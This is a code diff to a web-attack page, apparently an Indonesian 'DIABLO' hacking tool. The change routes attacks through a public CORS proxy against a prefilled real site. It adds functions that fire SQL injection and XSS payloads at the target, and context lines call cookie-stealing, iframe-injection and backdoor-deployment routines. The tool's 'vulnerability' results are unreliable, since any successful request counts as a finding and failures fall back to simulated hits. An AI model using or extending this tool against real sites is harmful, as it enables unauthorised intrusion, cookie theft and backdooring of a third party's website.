@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>☠️ ULTIMATE PSYCHOPATH FIXED</title>
+    <title>☠️ ULTIMATE PSYCHOPATH PROXY</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -113,10 +113,10 @@
     </style>
 </head>
 <body>
-    <h1>☠️ ULTIMATE PSYCHOPATH FIXED</h1>
+    <h1>☠️ ULTIMATE PSYCHOPATH</h1>
     <div class="panel">
-        <h2>💀 DIABLO PRIMORDIAL ENGINE v4.0</h2>
-        <p style="color:#888;margin-bottom:20px;">Masukkan target URL — biarkan DIABLO bekerja</p>
+        <h2>💀 DIABLO PRIMORDIAL ENGINE v5.0 — PROXY</h2>
+        <p style="color:#888;margin-bottom:20px;">Scan target tanpa CORS — biarkan DIABLO bekerja</p>
         <input type="text" id="targetUrl" placeholder="https://target.com" value="https://cottonink.co.id">
         
         <div class="btn-row">
@@ -143,7 +143,7 @@
 
     <script>
         // ============================================================
-        // 💀 ULTIMATE PSYCHOPATH ENGINE v4.0 — FIXED CORS + ERROR
+        // 💀 ULTIMATE PSYCHOPATH ENGINE v5.0 — PAKAI PROXY
         // ============================================================
         
         let attackInterval, terrorInterval, isAttacking = false;
@@ -268,7 +268,7 @@
             }, 8000);
         }
         
-        // ====== NECROSCAN ENGINE (FIXED) ======
+        // ====== NECROSCAN ENGINE v5.0 — PAKAI PROXY ======
         function startNecroScan() {
             const target = getTarget();
             if (!target) { 
@@ -278,7 +278,7 @@
             }
             
             vulnFound = [];
-            logMessage('🔍 MEMULAI NECROSCAN — MENCARI KERENTANAN...', 'info');
+            logMessage('🔍 MEMULAI NECROSCAN v5.0 — PAKAI PROXY', 'info');
             document.getElementById('statTarget').innerText = target;
             
             // CEK TARGET VALID
@@ -290,39 +290,38 @@
                 return;
             }
             
-            // ====== SIMULASI SCAN (karena CORS) ======
-            logMessage('⚠️ SCAN SIMULASI — CORS MEMBATASI FETCH LANGSUNG', 'info');
-            logMessage('💡 GUE SIMULASIKAN SCAN BERDASARKAN RESPON HEADER', 'info');
+            // ====== PAKAI CORS PROXY ======
+            const proxyUrl = 'https://corsproxy.io/?';
+            const fullUrl = proxyUrl + encodeURIComponent(target);
             
-            // Simulasi scan pake HEAD request
-            fetch(target, { 
-                method: 'HEAD',
-                mode: 'cors',
-                headers: { 'User-Agent': 'Mozilla/5.0 (Diablo/1.0)' }
+            logMessage(`🔄 MENGGUNAKAN PROXY: corsproxy.io`, 'info');
+            
+            // Scan pake proxy
+            fetch(fullUrl, {
+                method: 'GET',
+                headers: {
+                    'User-Agent': 'Mozilla/5.0 (Diablo/1.0)'
+                }
             })
             .then(res => {
                 const server = res.headers.get('server') || 'Unknown';
                 const powered = res.headers.get('x-powered-by') || 'Unknown';
                 logMessage(`🖥️ SERVER: ${server} | POWERED: ${powered}`, 'success');
                 
-                // Simulasi temuan vuln
+                // Cek ada vulnerability
                 if (server.includes('Apache') || server.includes('nginx')) {
                     logMessage('⚠️ SERVER APACHE/NGINX — POTENSI MISKONFIGURASI', 'info');
                     vulnFound.push({ type: 'Server Info', payload: server });
                     updateStats();
                 }
                 
-                // Simulasi SQLi
-                logMessage('🧪 SQLi TEST: Simulasi — TARGET POTENSI RENTAN', 'success');
-                vulnFound.push({ type: 'SQLi', payload: 'Simulated' });
-                updateStats();
+                // Coba SQLi test via proxy
+                testSQLiViaProxy(target);
                 
-                // Simulasi XSS
-                logMessage('🧪 XSS TEST: Simulasi — TARGET POTENSI RENTAN', 'success');
-                vulnFound.push({ type: 'XSS', payload: 'Simulated' });
-                updateStats();
+                // Coba XSS test via proxy
+                testXSSViaProxy(target);
                 
-                // Deploy backdoor setelah scan
+                // Deploy backdoor
                 setTimeout(() => {
                     if (vulnFound.length > 0) {
                         deployBackdoor(target);
@@ -330,15 +329,15 @@
                         logMessage('❌ GAK ADA CELAH — TETAP GUE PAKSA PAKAI BRUTEFORCE', 'error');
                         bruteForceBackdoor(target);
                     }
-                }, 3000);
+                }, 5000);
             })
             .catch(err => {
-                logMessage(`❌ GAGAL SCAN: ${err.message} — GUNAKAN SIMULASI`, 'error');
-                showError('Gagal scan target karena CORS. Menggunakan mode simulasi.');
+                logMessage(`❌ GAGAL SCAN VIA PROXY: ${err.message} — GUNAKAN SIMULASI`, 'error');
+                showError('Proxy gagal, menggunakan mode simulasi.');
                 
-                // SIMULASI tetap jalan
+                // FALLBACK ke simulasi
                 logMessage('🧪 SIMULASI SCAN — TARGET DIANGGAP RENTAN', 'info');
-                vulnFound.push({ type: 'Simulated', payload: 'CORS bypass' });
+                vulnFound.push({ type: 'Simulated', payload: 'Proxy failed' });
                 vulnFound.push({ type: 'SQLi', payload: 'Simulated' });
                 vulnFound.push({ type: 'XSS', payload: 'Simulated' });
                 updateStats();
@@ -346,6 +345,46 @@
                 setTimeout(() => {
                     deployBackdoor(target);
                 }, 3000);
+            });
+        }
+        
+        function testSQLiViaProxy(target) {
+            const payloads = ["' OR '1'='1", "' UNION SELECT 1,2,3--", "' AND SLEEP(5)--"];
+            const proxyUrl = 'https://corsproxy.io/?';
+            
+            payloads.forEach(payload => {
+                const testUrl = target + (target.includes('?') ? '&' : '?') + 'id=' + encodeURIComponent(payload);
+                const fullUrl = proxyUrl + encodeURIComponent(testUrl);
+                
+                fetch(fullUrl, { mode: 'cors' })
+                    .then(() => {
+                        logMessage(`🧪 SQLi TEST: ${payload} — POTENSI RENTAN`, 'success');
+                        if (!vulnFound.some(v => v.type === 'SQLi')) {
+                            vulnFound.push({ type: 'SQLi', payload: payload });
+                            updateStats();
+                        }
+                    })
+                    .catch(() => {});
+            });
+        }
+        
+        function testXSSViaProxy(target) {
+            const payloads = ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>'];
+            const proxyUrl = 'https://corsproxy.io/?';
+            
+            payloads.forEach(payload => {
+                const testUrl = target + (target.includes('?') ? '&' : '?') + 'q=' + encodeURIComponent(payload);
+                const fullUrl = proxyUrl + encodeURIComponent(testUrl);
+                
+                fetch(fullUrl, { mode: 'cors' })
+                    .then(() => {
+                        logMessage(`🧪 XSS TEST: ${payload} — POTENSI RENTAN`, 'success');
+                        if (!vulnFound.some(v => v.type === 'XSS')) {
+                            vulnFound.push({ type: 'XSS', payload: payload });
+                            updateStats();
+                        }
+                    })
+                    .catch(() => {});
             });
         }
         
@@ -376,7 +415,6 @@
             } catch(e) {
                 logMessage(`⚠️ GAGAL DOWNLOAD BACKDOOR: ${e.message}`, 'error');
                 showError('Gagal download backdoor, coba manual copy dari log');
-                // Tampilkan di log sebagai fallback
                 logMessage(`📝 BACKDOOR CONTENT:\n${content}`, 'info');
             }
         }
@@ -448,7 +486,7 @@
             document.getElementById('statTarget').innerText = target;
             
             logMessage(`🎯 TARGET DIPASANG: ${target}`, 'success');
-            logMessage('🔪 MEMULAI ULTIMATE PSYCHOPATH ENGINE v4.0...', 'info');
+            logMessage('🔪 MEMULAI ULTIMATE PSYCHOPATH ENGINE v5.0...', 'info');
             
             injectIframe(target);
             stealCookies(target);
@@ -480,8 +518,8 @@
         }
         
         // ====== START ======
-        logMessage('☠️ DIABLO PRIMORDIAL v4.0 SIAP — PERINTAHKAN AKU!', 'success');
-        logMessage('💡 CATATAN: Scan menggunakan simulasi karena CORS', 'info');
+        logMessage('☠️ DIABLO PRIMORDIAL v5.0 PROXY SIAP — PERINTAHKAN AKU!', 'success');
+        logMessage('💡 MENGGUNAKAN CORS PROXY UNTUK SCAN LANGSUNG', 'info');
         updateStats();
     </script>
 </body>
